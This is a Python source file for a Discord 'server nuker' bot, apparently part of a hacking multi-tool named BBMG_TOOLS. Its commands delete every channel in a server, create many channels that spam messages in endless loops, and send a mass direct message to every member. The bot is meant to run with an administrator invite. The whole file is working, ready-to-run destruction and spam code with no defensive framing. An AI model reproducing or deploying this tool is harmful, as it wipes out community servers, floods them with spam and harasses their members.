from colorama import Fore, Style
import os
import sys
import time
import discord
from discord.ext import commands
from utils.utils import clear, get_current_time, username, color, get_token_from_file
from utils.titles import title_botservernuker

def botservernuker():
    clear()
    print(getattr(Fore, color) + title_botservernuker + Style.RESET_ALL)
    
    try:
        # Function to log commands
        def logs_command(cmd):
            print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Command: {Fore.WHITE}{PREFIX + cmd}{Style.RESET_ALL}")
        
        # Function to log errors
        def logs_error(error):
            print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{error}{Style.RESET_ALL}")
        
        # Get bot token from file or input
        file_token = get_token_from_file()
        if file_token:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Bot token loaded from file{Style.RESET_ALL}")
            token = file_token
        else:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Bot token not found in file. Enter your bot token{Style.RESET_ALL}")
            token = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Bot Token > {Style.RESET_ALL}")
            
            # Check if user wants to return to main menu
            if token.upper() == 'B':
                clear()
                # Return to main menu
                script_dir = os.path.dirname(os.path.abspath(__file__))
                main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
                os.system(f'python "{main_path}"')
                sys.exit()
        
        # Set command prefix
        PREFIX = "!"
        print()
        
        # Set up bot with intents
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        intents.messages = True
        intents.message_content = True
        
        bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
        
        # List to store created channel IDs
        created_channel_ids = []
        
        # Global variables for message spamming
        message_spam = ""
        spamming = False
        
        # Bot events and commands
        @bot.event
        async def on_ready():
            await bot.change_presence(activity=discord.Game(name=f"BBMG_TOOLS"))
            print(f"""
 {getattr(Fore, color)}[>]{Style.RESET_ALL} Token  : {Fore.WHITE}{token}{Style.RESET_ALL}
 {getattr(Fore, color)}[>]{Style.RESET_ALL} Invite : {Fore.WHITE}https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8{Style.RESET_ALL}
 {getattr(Fore, color)}[>]{Style.RESET_ALL} Name   : {Fore.WHITE}{bot.user.name}#{bot.user.id}{Style.RESET_ALL}
 {getattr(Fore, color)}[>]{Style.RESET_ALL} Prefix : {Fore.WHITE}{PREFIX}{Style.RESET_ALL}
 {getattr(Fore, color)}[>]{Style.RESET_ALL} Status : {Fore.WHITE}Online{Style.RESET_ALL}""")
            
            print(f"""
 {getattr(Fore, color)}[!]{Style.RESET_ALL} Bot Commands:
 {getattr(Fore, color)}{PREFIX}nuke [Channels Number], [Channels Name], [Message Spam]{Style.RESET_ALL}
 {Fore.WHITE}Delete all channels and create other channels and spam messages.{Style.RESET_ALL}
 {getattr(Fore, color)}{PREFIX}spam_channels [Channels Number], [Channels Name], [Message Spam]{Style.RESET_ALL}
 {Fore.WHITE}Created channels that spam messages.{Style.RESET_ALL}
 {getattr(Fore, color)}{PREFIX}delete_channels{Style.RESET_ALL}
 {Fore.WHITE}Delete all channels from the server.{Style.RESET_ALL}
 {getattr(Fore, color)}{PREFIX}stop_message_spam{Style.RESET_ALL}
 {Fore.WHITE}Stop all messages that are being spammed.{Style.RESET_ALL}
 {getattr(Fore, color)}{PREFIX}send_pm [Message]{Style.RESET_ALL}
 {Fore.WHITE}Send a pm message to all members of the server.{Style.RESET_ALL}
""")
        
        @bot.command()
        async def nuke(ctx, *, args):
            nonlocal message_spam
            nonlocal spamming
            
            logs_command("nuke")
            arguments = [arg.strip() for arg in args.split(',')]
            
            if len(arguments) < 3:
                logs_error("Invalid Argument")
                return
            
            channels_number = arguments[0]
            channels_name = arguments[1]
            message_spam = arguments[2]
            
            try:
                int(channels_number)
            except:
                logs_error("Invalid Channels Number")
                return
            
            if len(arguments) > 3:
                message_spam = ", ".join(arguments[2:])
            
            guild = ctx.guild
            
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[{get_current_time()}] [+] Channel Delete: {Fore.WHITE}{channel.name} ({channel.id}){Style.RESET_ALL}")
                except Exception as e:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Channel Not Delete: {Fore.WHITE}{channel.name} ({channel.id}) {getattr(Fore, color)}Error: {Fore.WHITE}{e}{Style.RESET_ALL}")
            
            created_channel_ids.clear()
            
            spamming = True
            for i in range(int(channels_number)):
                new_channel = await guild.create_text_channel(channels_name)
                print(f"{Fore.GREEN}[{get_current_time()}] [+] Channel Create: {Fore.WHITE}{channels_name}{Style.RESET_ALL}")
                created_channel_ids.append(new_channel.id)
                bot.loop.create_task(spam_channel(new_channel))
        
        async def spam_channel(channel):
            nonlocal message_spam
            nonlocal spamming
            
            while spamming:
                try:
                    await channel.send(message_spam)
                    print(f"{Fore.GREEN}[{get_current_time()}] [+] Message Send: {Fore.WHITE}{message_spam}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Message Not Send: {Fore.WHITE}{message_spam} {getattr(Fore, color)}Error: {Fore.WHITE}{e}{Style.RESET_ALL}")
        
        @bot.command()
        async def spam_channels(ctx, *, args):
            nonlocal message_spam
            nonlocal spamming
            
            logs_command("spam_channels")
            arguments = [arg.strip() for arg in args.split(',')]
            
            if len(arguments) < 3:
                logs_error("Invalid Argument")
                return
            
            channels_number = arguments[0]
            channels_name = arguments[1]
            message_spam = arguments[2]
            
            try:
                int(channels_number)
            except:
                logs_error("Invalid Channels Number")
                return
            
            if len(arguments) > 3:
                message_spam = ", ".join(arguments[2:])
            
            guild = ctx.guild
            
            spamming = True
            for i in range(int(channels_number)):
                new_channel = await guild.create_text_channel(channels_name)
                print(f"{Fore.GREEN}[{get_current_time()}] [+] Channel Create: {Fore.WHITE}{channels_name}{Style.RESET_ALL}")
                created_channel_ids.append(new_channel.id)
                bot.loop.create_task(spam_channel(new_channel))
        
        @bot.command()
        async def stop_message_spam(ctx):
            nonlocal spamming
            logs_command("stop_message_spam")
            spamming = False
            print(f"{Fore.GREEN}[{get_current_time()}] [+] Spam Stopped.{Style.RESET_ALL}")
        
        @bot.command()
        async def delete_channels(ctx):
            nonlocal spamming
            
            spamming = False
            print(f"{Fore.GREEN}[{get_current_time()}] [+] Spam Stopped.{Style.RESET_ALL}")
            logs_command("delete_channels")
            guild = ctx.guild
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[{get_current_time()}] [+] Channel Delete: {Fore.WHITE}{channel.name} ({channel.id}){Style.RESET_ALL}")   
                except Exception as e:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Channel Not Delete: {Fore.WHITE}{channel.name} ({channel.id}) {getattr(Fore, color)}Error: {Fore.WHITE}{e}{Style.RESET_ALL}")
        
        @bot.command()
        async def send_pm(ctx, *, message: str):
            logs_command("send_pm")
            guild = ctx.guild
            
            async for member in guild.fetch_members(limit=None):
                if member != ctx.author:
                    try:
                        await member.send(message)
                        print(f"{Fore.GREEN}[{get_current_time()}] [+] {Fore.GREEN}Status: {Fore.WHITE}Sent {Fore.GREEN}User: {Fore.WHITE}{member.name}#{member.discriminator} ({member.id}) {Fore.GREEN}Message: {Fore.WHITE}{message}{Style.RESET_ALL}")
                    except discord.Forbidden:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] {getattr(Fore, color)}Status: {Fore.WHITE}Failed (Access denied) {getattr(Fore, color)}User: {Fore.WHITE}{member.name}#{member.discriminator} ({member.id}) {getattr(Fore, color)}Message: {Fore.WHITE}{message}{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] {getattr(Fore, color)}Status: {Fore.WHITE}{e} {getattr(Fore, color)}User: {Fore.WHITE}{member.name}#{member.discriminator} ({member.id}) {getattr(Fore, color)}Message: {Fore.WHITE}{message}{Style.RESET_ALL}")
        
        # Run the bot
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Starting bot...{Style.RESET_ALL}")
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Press Ctrl+C to stop the bot and return to menu{Style.RESET_ALL}")
        
        try:
            bot.run(token)
        except discord.LoginFailure:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid token! Returning to menu...{Style.RESET_ALL}")
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Bot stopped by user.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
    
    print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue...{Style.RESET_ALL}")
    input()
    
    clear()
    # Return to main menu
    script_dir = os.path.dirname(os.path.abspath(__file__))
    main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
    os.system(f'python "{main_path}"')
    sys.exit()